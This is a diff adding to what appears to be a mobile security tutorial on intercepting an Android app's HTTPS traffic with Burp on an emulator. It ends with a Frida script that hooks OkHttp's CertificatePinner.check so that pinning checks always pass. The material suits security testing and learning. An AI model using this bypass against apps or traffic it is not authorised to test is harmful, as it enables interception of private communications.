@@ -27,4 +27,43 @@ b4 pinning we need to install root CA. Only browsers accept user provided certif
 
 ### Using burp to perform MitM
 
-With the certificate installed we can configure the emulator to use Burp as a proxy in order to intercept all requests.
+With the certificate installed we can configure the emulator to use Burp as a proxy in order to intercept requests. We can see the request appear in burp and in the app without any problem
+
+![](res/2020-05-23-12-35-11.png)
+![](res/2020-05-23-12-35-35.png)
+
+When performing a pinned request inside our app, the `Okhttp` library performs a check on the certificate provided. In this case, our installed certificate is not accepted by the app even if the system trusts it, as it does not pass the internal check
+
+```java
+CertificatePinner certpin = new CertificatePinner.Builder()
+         .add(hostname, "sha256/eSiyNwaNIbIkI94wfLFmhq8/ATxm30i973pMZ669tZo=")
+         .build();
+```
+
+![](res/2020-05-23-12-45-01.png)
+
+### Bypassinc certificate pinning
+
+```js
+setTimeout(function() {
+    Java.perform(function () {
+      // OkHTTPv3 (double bypass)
+      try {
+         var okhttp3_Activity = Java.use('okhttp3.CertificatePinner');
+         okhttp3_Activity.check.overload('java.lang.String', 'java.util.List').implementation = function (str) {
+               console.log('[+] Bypassing OkHTTPv3 {1}: ' + str);
+               return true;
+         };
+         // This method of CertificatePinner.check could be found in some old Android app
+         okhttp3_Activity.check.overload('java.lang.String', 'java.security.cert.Certificate').implementation = function (str) {
+               console.log('[+] Bypassing OkHTTPv3 {2}: ' + str);
+               return true;
+         };
+
+      } catch (err) {
+         console.log('[-] OkHTTPv3 pinner not found');
+         //console.log(err);
+      }
+   }
+}, 0);
+```
